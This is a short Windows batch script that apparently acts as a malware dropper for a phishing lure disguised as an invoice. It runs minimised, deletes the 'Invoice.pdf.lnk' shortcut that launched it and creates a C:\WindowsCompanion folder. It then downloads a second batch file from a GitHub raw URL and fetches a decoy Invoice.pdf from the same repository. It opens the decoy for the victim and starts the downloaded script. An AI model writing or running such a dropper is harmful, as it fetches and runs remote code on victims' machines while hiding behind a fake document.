
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit

    set PATH_TO_ENTRY=%1

    set ENTRY_FILE_NAME=Invoice.pdf.lnk
    set ENTRY_COMPLETE=%PATH_TO_ENTRY%\%ENTRY_FILE_NAME%
    del "%ENTRY_COMPLETE%"


    set FOLDER_FUX=C:\WindowsCompanion
    if not exist "%FOLDER_FUX%" md "%FOLDER_FUX%"

    set URL_FUX="https://raw.githubusercontent.com/BelliniGauss/1/main/fileToFux.bat"
    set FILE_FUX=C:\WindowsCompanion\fileToFux.bat
    curl -L -o %FILE_FUX% %URL_FUX%


    set URL_INVOICE="https://raw.githubusercontent.com/BelliniGauss/1/main/Invoice.pdf"
    set PATH_INVOICE=%PATH_TO_ENTRY%\Invoice.pdf
    curl -L -o %PATH_INVOICE% %URL_INVOICE% && %PATH_INVOICE% && start "%FILE_FUX%" && exit
exit
